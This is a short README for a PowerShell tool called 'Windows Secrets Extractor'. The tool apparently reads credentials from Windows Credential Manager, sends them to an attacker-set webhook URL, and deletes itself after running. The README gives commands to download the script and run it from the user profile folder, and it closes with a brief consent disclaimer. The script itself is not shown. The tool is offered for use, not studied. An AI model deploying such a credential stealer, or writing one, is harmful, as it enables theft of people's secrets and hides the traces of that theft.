# Windows Secrets Extractor


### Requirements
- PowerShell **CredentialManager** Module : ``Install-Module -Name CredentialManager``


### Before Usage
- Adapt line 1 and enter your WebHook URL.

### Usage
1. Download the script :
2. ```Invoke-WebRequest <URL> -outfile $env:USERPROFILE\extractor.ps1```
3. Run the Script : ``cd $env:USERPROFILE;.\extractor.ps1``

Note: the script self-destructs after execution

***
Be careful, I am not responsible for your use of this script.
Please do not use it against machines whose owner has not given you their consent
